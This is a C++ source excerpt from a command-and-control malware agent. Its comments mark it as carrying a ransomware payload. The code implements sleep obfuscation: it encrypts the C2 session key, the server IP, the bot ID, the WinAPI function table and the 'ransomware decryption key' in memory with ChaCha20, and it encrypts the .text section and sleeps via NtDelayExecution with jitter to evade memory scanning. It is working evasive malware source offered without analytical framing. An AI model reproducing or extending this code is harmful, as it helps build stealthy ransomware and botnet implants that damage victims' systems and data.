void C2Agent::startBackgroundThread() {
    thread(&C2Agent::c2_background_thread, this).detach();
}

void C2Agent::stopBackgroundThread() {
    running = false;
}

// ============================================================================
// SLEEP OBJUSCATION HELPERS — Encrypt/decrypt all sensitive globals
// ============================================================================
// Uses ChaCha20 XOR (symmetric): calling obfuscateSleepData() with the same
// key/nonce/counters BOTH encrypts before sleep AND decrypts after sleep.
// ============================================================================
#ifdef _WIN32
// ============================================================================
// SLEEP OBFUSCATION — Enhanced globals encryption (ChaCha20)
// ============================================================================
// Encrypts/decrypts all sensitive globals during sleep using ChaCha20 XOR.
// This runs IN ADDITION to the SleepObfuscation module's .text encryption
// and NtDelayExecution. Both layers work together for defense-in-depth.
// ============================================================================
static uint8_t sleep_obf_key[32] = {0};
static uint8_t sleep_obf_nonce[12] = {0};
static bool sleep_obf_initialized = false;

static void obfuscateSleepData() {
    if (!g_indirect_initialized || !c2_state_initialized) return;

    // Generate key+nonce once on first call
    if (!sleep_obf_initialized) {
        random_device rd;
        for (int i = 0; i < 32; i++) sleep_obf_key[i] = (uint8_t)(rd() & 0xFF);
        for (int i = 0; i < 12; i++) sleep_obf_nonce[i] = (uint8_t)(rd() & 0xFF);
        sleep_obf_initialized = true;
    }

    uint32_t ctr = 0;

    // 1. C2 session key (32 bytes — active encryption key)
    chacha20BufferObfuscate(c2_session_key, 32, sleep_obf_key, sleep_obf_nonce, ctr++);

    // 2. c2_state_initialized flag
    chacha20BufferObfuscate((unsigned char*)&c2_state_initialized, sizeof(bool), sleep_obf_key, sleep_obf_nonce, ctr++);

    // 3. Encryption key global (ransomware decryption key — CRITICAL)
    if (!encryption_key_global.empty()) {
        chacha20BufferObfuscate((unsigned char*)encryption_key_global.data(),
                                encryption_key_global.length(), sleep_obf_key, sleep_obf_nonce, ctr++);
    }

    // 4. Last encryption algorithm name
    if (!last_encryption_algo.empty()) {
        chacha20BufferObfuscate((unsigned char*)last_encryption_algo.data(),
                                last_encryption_algo.length(), sleep_obf_key, sleep_obf_nonce, ctr++);
    }

    // 5. C2 server IP address
    if (!c2_server_ip.empty()) {
        chacha20BufferObfuscate((unsigned char*)c2_server_ip.data(),
                                c2_server_ip.length(), sleep_obf_key, sleep_obf_nonce, ctr++);
    }

    // 6. Bot ID
    if (!c2_bot_id.empty()) {
        chacha20BufferObfuscate((unsigned char*)c2_bot_id.data(),
                                c2_bot_id.length(), sleep_obf_key, sleep_obf_nonce, ctr++);
    }

    // 7. ApiTable (all WinAPI function pointers — reveals entire capability set)
    chacha20BufferObfuscate((unsigned char*)&g_api, sizeof(ApiTable), sleep_obf_key, sleep_obf_nonce, ctr++);
}
#endif // _WIN32

// ============================================================================
// SLEEP FUNCTIONS (global)
// ============================================================================
// NOTE: The .text-encrypting sleep path is ONLY safe in HEADLESS builds.
// In GUI mode the C2 background thread sleeps WHILE the wxWidgets main
// thread executes code from the same .text section — encrypting it would
// 0xc0000005-crash the GUI thread. Plain Sleep keeps the exact same timing
// semantics without the multi-threaded self-corruption race.
void secureSleep(int seconds) {
#ifdef _WIN32
#ifdef HEADLESS
    obfuscateSleepData();
    // SleepObfuscation handles: .text encrypt + NtDelayExecution + jitter + .text decrypt
    // Jitter is applied internally (±30%) — no need for double jitter here
    SleepObfuscation::obfuscatedSleep(seconds);
    obfuscateSleepData();  // XOR restore globals (symmetric)
#else
    g_api.Sleep((DWORD)(seconds * 1000));
#endif
#else
    std::this_thread::sleep_for(std::chrono::seconds(seconds));
#endif
}

void secureSleepMs(int milliseconds) {
#ifdef _WIN32
#ifdef HEADLESS
    if (milliseconds >= 50) {
        obfuscateSleepData();
        // SleepObfuscation handles: .text encrypt + NtDelayExecution + jitter + .text decrypt
        SleepObfuscation::obfuscatedSleepMs(milliseconds);
        obfuscateSleepData();  // XOR restore globals (symmetric)
    } else {
        g_api.Sleep(milliseconds);
    }
#else
    g_api.Sleep((DWORD)milliseconds);
#endif
#else
    std::this_thread::sleep_for(std::chrono::milliseconds(milliseconds));
#endif
}

void registerC2State(const unsigned char* key, size_t key_len, const string& ip, const string& bot) {
    if (key_len >= 32) {
        memcpy(c2_session_key, key, 32);
    }
    c2_server_ip = ip;
    c2_bot_id = bot;
    c2_state_initialized = true;
}
